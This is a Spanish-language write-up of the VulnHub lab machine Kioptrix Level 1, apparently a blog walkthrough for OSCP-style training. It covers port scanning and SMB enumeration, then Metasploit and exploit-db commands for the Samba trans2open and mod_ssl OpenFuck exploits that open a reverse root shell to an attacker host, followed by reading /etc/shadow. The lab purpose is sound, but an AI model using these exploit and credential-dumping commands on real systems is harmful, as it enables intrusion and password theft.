---
title: 'Kioptrix Level 1 - VulnHub'
description: 'Writeup de Kioptrix Level 1 de VulnHub. Máquina clásica para principiantes. Explotación de una vulnerabilidad en Samba mediante el exploit trans2open (CVE-2003-0201) para obtener acceso root directo.'
pubDate: 2026-01-12
platform: 'vulnhub'
category: 'machines'
difficulty: 'easy'
os: 'linux'
language: es
tags:
  [
    'samba',
    'smb',
    'CVE-2003-0201',
    'trans2open',
    'buffer-overflow',
    'metasploit',
    'apache',
  ]
retired: false
heroImage: '/images/writeups/vulnhub/kioptrix1-card.png'
attackVectors: ['network']
techniques: ['T1210', 'T1068']
vulnerabilities: ['CVE-2003-0201', 'CVE-2002-0082']
certifications: ['OSCP', 'eJPT']
skillLevel: 'beginner'
estimatedTime: '1 hora'
rating: 4.6
---

# Kioptrix Level 1 - VulnHub Writeup

**Dificultad**: Easy
**OS**: Linux
**Plataforma**: VulnHub
**Descarga**: [VulnHub - Kioptrix Level 1](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)

## Introducción

Kioptrix Level 1 es una de las máquinas más clásicas del mundo del pentesting, especialmente popular como preparación para el OSCP. Presenta software muy desactualizado de 2001-2002 con múltiples vulnerabilidades. El vector principal es el exploit **trans2open** contra Samba, que da acceso `root` directamente sin necesidad de escalada.

## Configuración del Laboratorio

Importar la OVA en VirtualBox/VMware. La máquina obtiene dirección IP por DHCP. Para descubrirla:

```bash
netdiscover -r 192.168.1.0/24
# o
arp-scan --localnet
```

En este ejemplo usamos `192.168.1.100`.

## Reconocimiento

### Escaneo de puertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.100 -oG allPorts
```

**Puertos abiertos:**

```
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
443/tcp  open  https
32768/tcp open  status
```

### Escaneo de versiones

```bash
nmap -p22,80,111,139,443,32768 -sCV 192.168.1.100 -oN targeted
```

**Resultados clave:**

```
22/tcp   open  ssh     OpenSSH 2.9p2
80/tcp   open  http    Apache/1.3.20 (Unix) mod_ssl/2.8.4 OpenSSL/0.9.6b
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https Apache/1.3.20
```

> Apache 1.3.20, OpenSSH 2.9p2 y Samba de 2001-2002 — todo extremadamente desactualizado.

## Enumeración

### Enumeración SMB

```bash
smbclient -L //192.168.1.100 -N
enum4linux -a 192.168.1.100
```

**Información del sistema:**

```
Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
```

**Versión Samba: 2.2.1a** — vulnerable a varios exploits críticos.

### Búsqueda de exploits

```bash
searchsploit samba 2.2
```

```
Samba 2.2.0 - 2.2.8 - trans2open Overflow (Linux/x86)
Samba < 2.2.8 - Remote Command Execution
```

El exploit **trans2open** (CVE-2003-0201) afecta a Samba 2.2.0 hasta 2.2.8, lo que incluye nuestra versión 2.2.1a.

### Enumeración Web

```bash
nikto -h http://192.168.1.100
```

**Vectores detectados por Nikto:**

```
+ Apache/1.3.20 appears to be outdated
+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow
+ OpenSSL/0.9.6b - CVE-2002-0082 (OpenFuck/ptrace-kmod)
```

## Explotación

### Método 1: Metasploit - trans2open

```bash
msfconsole -q
search trans2open
use exploit/linux/samba/trans2open
set RHOSTS 192.168.1.100
set PAYLOAD linux/x86/shell/reverse_tcp
set LHOST 192.168.1.50
run
```

```
[*] Started reverse TCP handler
[*] Trying return address 0xbffffb70...
[*] Trying return address 0xbffffb68...
[*] Trying return address 0xbffffb60...
[*] Sending stage (36 bytes) to 192.168.1.100
[*] Command shell session 1 opened

id
uid=0(root) gid=0(root) groups=99(nobody)
```

**Root directo.**

### Método 2: Exploit manual

```bash
searchsploit -p 10.c  # trans2open para Linux/x86
cp /usr/share/exploitdb/exploits/linux/remote/10.c .
gcc -o trans2open 10.c
./trans2open 192.168.1.100 0.0.0.0
```

Si la conexión se cae (proceso muere), es normal con este exploit antiguo — reintentar varias veces.

### Alternativa: OpenFuck (mod_ssl)

El servidor Apache 1.3.20 con mod_ssl/2.8.4 también es vulnerable a **OpenFuck** (CVE-2002-0082):

```bash
searchsploit -p 764.c
cp /usr/share/exploitdb/exploits/unix/remote/764.c .
```

Requiere parchear el exploit para compilar en versiones modernas de GCC (ajustar headers). Una vez compilado:

```bash
./openFuck 0x6b 192.168.1.100 443 -c 40
```

## Post-Explotación

```bash
# Verificar privilegios
id
whoami

# Sistema operativo
uname -a
# Linux kioptrix.example.com 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown

# Buscar flag (si existe)
find / -name "*.txt" -not -path "*/proc/*" 2>/dev/null

# Archivos de contraseñas
cat /etc/passwd
cat /etc/shadow
```

## Conclusión

Kioptrix Level 1 es un excelente inicio para el camino hacia el OSCP. Aunque el software es de 2001, los conceptos son eternamente aplicables:

- **Identificar versiones exactas** de todos los servicios
- **Buscar CVEs** para cada versión detectada
- **No descartar ningún servicio** — Samba, Apache y mod_ssl eran todos vulnerables
- Los exploits públicos no siempre funcionan a la primera en versiones antiguas de GCC

| Servicio | Versión | CVE           |
| -------- | ------- | ------------- |
| Samba    | 2.2.1a  | CVE-2003-0201 |
| mod_ssl  | 2.8.4   | CVE-2002-0082 |
| Apache   | 1.3.20  | múltiples     |

## Recursos

- [Kioptrix Level 1 en VulnHub](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)
- [CVE-2003-0201 - trans2open](https://www.cvedetails.com/cve/CVE-2003-0201/)
- [IppSec - Kioptrix Level 1 Walkthrough](https://www.youtube.com/watch?v=82TI2aKOK7A)
